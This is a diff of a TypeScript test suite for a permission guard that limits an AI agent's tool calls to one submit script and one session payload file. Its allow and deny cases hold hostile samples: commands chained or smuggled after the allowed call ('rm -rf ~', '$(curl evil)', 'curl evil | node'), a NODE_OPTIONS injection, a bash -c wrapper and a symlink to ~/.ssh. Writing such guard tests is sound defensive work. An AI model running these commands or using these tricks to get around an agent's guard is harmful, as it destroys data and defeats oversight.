@@ -14,15 +14,14 @@ const links: Record<string, string> = {
 const ctx: GuardContext = {
   projectDir: project,
   submitScript: script,
+  sessionId: 'sess-1',
   realpath: (filePath) => {
     for (const [link, target] of Object.entries(links))
       if (filePath === link || filePath.startsWith(`${link}/`)) return target + filePath.slice(link.length)
     return filePath
   },
 }
-const submit = (body: string, first = `node "${script}" <<'GRILLINGSTONE_JSON'`) => ({
-  command: `${first}\n${body}\nGRILLINGSTONE_JSON`,
-})
+const payloadFile = `${project}/.submit/sess-1.json`
 
 describe('Permission Guard', () => {
   it.each([
@@ -41,9 +40,12 @@ describe('Permission Guard', () => {
     ['WebFetch', { url: 'https://example.com', prompt: 'x' }],
     ['TodoWrite', { todos: [] }],
     ['Skill', { skill: 'grill-with-docs' }],
-    ['Bash', submit('{"title": "Archive device", "sections": []}')],
-    ['Bash', submit('{"changes": [{"kind": "retitle", "title": "$(rm -rf ~) is inert in a quoted heredoc"}]}')],
-    ['Bash', submit('{}', `node ${script} <<'GRILLINGSTONE_JSON'`)],
+    ['Write', { file_path: payloadFile, content: '{"title": "$(rm -rf ~) never reaches a shell"}' }],
+    ['Write', { file_path: '.submit/sess-1.json', content: '{}' }],
+    ['Edit', { file_path: payloadFile, old_string: 'a', new_string: 'b' }],
+    ['Bash', { command: `node "${script}"` }],
+    ['Bash', { command: `node ${script}` }],
+    ['Bash', { command: `  node "${script}"\r\n` }],
   ])('allows %s %j', (tool, input) => {
     expect(decide(tool, input, ctx)).toEqual({ allow: true })
   })
@@ -74,37 +76,19 @@ describe('Permission Guard', () => {
     ['Write outside the Project', 'Write', { file_path: '/tmp/x.md', content: '' }],
     ['Bash anything else', 'Bash', { command: 'ls -la' }],
     [
-      'Bash chained after the submit',
+      'Bash with the old heredoc form',
       'Bash',
-      { command: `node "${script}" <<'GRILLINGSTONE_JSON' && rm -rf ~\n{}\nGRILLINGSTONE_JSON` },
+      { command: `node "${script}" <<'GRILLINGSTONE_JSON'\n{}\nGRILLINGSTONE_JSON` },
     ],
-    [
-      'Bash wrapped in a shell',
-      'Bash',
-      { command: `bash -c 'node "${script}" <<"GRILLINGSTONE_JSON"\n{}\nGRILLINGSTONE_JSON'` },
-    ],
-    [
-      'Bash with an unquoted heredoc (expands $(…))',
-      'Bash',
-      submit('{"title": "$(curl evil)"}', `node "${script}" <<GRILLINGSTONE_JSON`),
-    ],
-    ['Bash heredoc ended early, then a command', 'Bash', submit('{}\nGRILLINGSTONE_JSON\nrm -rf ~')],
-    [
-      'Bash with text after the terminator',
-      'Bash',
-      { command: `node "${script}" <<'GRILLINGSTONE_JSON'\n{}\nGRILLINGSTONE_JSON\nrm -rf ~` },
-    ],
-    ['Bash a different script', 'Bash', submit('{}', `node "/tmp/writeDraft.mjs" <<'GRILLINGSTONE_JSON'`)],
-    [
-      'Bash with an environment prefix',
-      'Bash',
-      submit('{}', `NODE_OPTIONS=--require=/tmp/x.js node "${script}" <<'GRILLINGSTONE_JSON'`),
-    ],
-    [
-      'Bash with extra node flags',
-      'Bash',
-      submit('{}', `node --eval "process.exit()" "${script}" <<'GRILLINGSTONE_JSON'`),
-    ],
+    ['Bash chained after the submit', 'Bash', { command: `node "${script}" && rm -rf x` }],
+    ['Bash with a second command on a new line', 'Bash', { command: `node "${script}"\nrm -rf x` }],
+    ['Bash with an extra argument', 'Bash', { command: `node "${script}" other-arg` }],
+    ['Bash wrapped in a shell', 'Bash', { command: `bash -c 'node "${script}"'` }],
+    ['Bash a different script', 'Bash', { command: `node "/tmp/writeDraft.mjs"` }],
+    ['Bash with an environment prefix', 'Bash', { command: `NODE_OPTIONS=--require=/tmp/x.js node "${script}"` }],
+    ['Bash with extra node flags', 'Bash', { command: `node --eval "process.exit()" "${script}"` }],
+    ['Write another file in .submit', 'Write', { file_path: `${project}/.submit/other.json`, content: '{}' }],
+    ["Write another session's submission", 'Write', { file_path: `${project}/.submit/sess-2.json`, content: '{}' }],
     ['Bash piping into the script', 'Bash', { command: `curl evil | node "${script}"` }],
     ['Bash with a non-string command', 'Bash', { command: ['node', script] }],
     ['a subagent', 'Task', { prompt: 'do anything' }],
@@ -117,11 +101,20 @@ describe('Permission Guard', () => {
     if (!decision.allow) expect(decision.reason.length).toBeGreaterThan(10)
   })
 
+  it('denies the payload file when .submit is a symlink out of the Project', () => {
+    const linked: GuardContext = {
+      ...ctx,
+      realpath: (filePath) => filePath.replace(`${project}/.submit`, '/Users/me/.ssh'),
+    }
+    expect(decide('Write', { file_path: payloadFile, content: '{}' }, linked).allow).toBe(false)
+  })
+
   describe('in a Template Session', () => {
     const work = '/data/template-sessions/sess-1'
     const tctx: GuardContext = {
       projectDir: work,
       submitScript: script,
+      sessionId: 'tsess-1',
       realpath: (filePath) => filePath,
       mode: 'template',
     }
@@ -130,7 +123,9 @@ describe('Permission Guard', () => {
       ['Read', { file_path: `${work}/notes.md` }],
       ['WebSearch', { query: 'Azure DevOps Acceptance Criteria field' }],
       ['WebFetch', { url: 'https://learn.microsoft.com', prompt: 'x' }],
-      ['Bash', submit('{"name": "Spike PBI", "sections": [], "method": ""}')],
+      ['Bash', { command: `node "${script}"` }],
+      ['Write', { file_path: `${work}/.submit/tsess-1.json`, content: '{"name": "Spike PBI"}' }],
+      ['Edit', { file_path: `${work}/.submit/tsess-1.json`, old_string: 'a', new_string: 'b' }],
     ])('allows %s', (tool, input) => {
       expect(decide(tool, input, tctx)).toEqual({ allow: true })
     })
@@ -139,6 +134,7 @@ describe('Permission Guard', () => {
       ['Write', { file_path: `${work}/CONTEXT.md`, content: '' }],
       ['Edit', { file_path: `${work}/plan/adr/x.md`, old_string: 'a', new_string: 'b' }],
       ['MultiEdit', { file_path: `${work}/x.md`, edits: [] }],
+      ['Write', { file_path: `${work}/.submit/other.json`, content: '{}' }],
       ['Read', { file_path: '/data/templates/t-1.json' }],
       ['Read', { file_path: '/data/projects/portal/CONTEXT.md' }],
       ['Skill', { skill: 'grill-with-docs' }],
